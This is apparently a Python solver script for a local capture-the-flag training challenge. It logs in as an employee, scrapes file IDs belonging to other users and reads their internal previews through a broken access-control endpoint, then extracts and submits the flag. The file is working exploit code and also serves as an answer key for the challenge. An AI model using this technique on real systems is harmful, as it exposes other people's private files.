from __future__ import annotations

import argparse
import re
from urllib.parse import urljoin

import requests


FILE_ID_RE = re.compile(r"FILE-2026-\d{4}")
FLAG_RE = re.compile(r"flag\{[^}\r\n]+\}")


def main() -> int:
    parser = argparse.ArgumentParser(description="Solve the local core-b05 training challenge")
    parser.add_argument("--base", required=True, help="challenge base URL")
    parser.add_argument("--submit-url")
    parser.add_argument("--instance-id")
    args = parser.parse_args()
    base = args.base.rstrip("/") + "/"
    session = requests.Session()

    login = session.post(urljoin(base, "login"), data={"username": "employee", "password": "employee-pass"}, timeout=10)
    login.raise_for_status()
    for path in ("profile", "upload", "files"):
        session.get(urljoin(base, path), timeout=10).raise_for_status()

    upload = session.post(
        urljoin(base, "api/files"),
        files={"file": ("resume.txt", b"normal employee upload for review", "text/plain")},
        timeout=10,
    )
    upload.raise_for_status()
    own_file_id = upload.json()["file_id"]
    files_page = session.get(urljoin(base, "files"), timeout=10)
    files_page.raise_for_status()
    discovered_ids = set(FILE_ID_RE.findall(files_page.text))
    foreign_ids = discovered_ids - {own_file_id}
    if not foreign_ids:
        raise RuntimeError("no review-queue file reference discovered")

    foreign_id = sorted(foreign_ids)[0]
    processing = session.get(urljoin(base, f"api/files/{foreign_id}/processing"), timeout=10)
    processing.raise_for_status()
    details = processing.json()
    if details["owner"] == "employee":
        raise RuntimeError("discovered file was not outside the employee account")
    preview_url = details["preview_url"]
    preview = session.get(urljoin(base, preview_url.lstrip("/")), timeout=10)
    preview.raise_for_status()
    match = FLAG_RE.search(preview.text)
    if not match:
        raise RuntimeError("internal review preview did not contain a flag")
    flag = match.group(0)
    result = {"challenge": "core-b05", "file_id": foreign_id, "flag": flag}
    if args.submit_url:
        submitted = session.post(args.submit_url, json={"flag": flag}, timeout=10)
        submitted.raise_for_status()
        result["submit"] = submitted.json()
    print(result)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
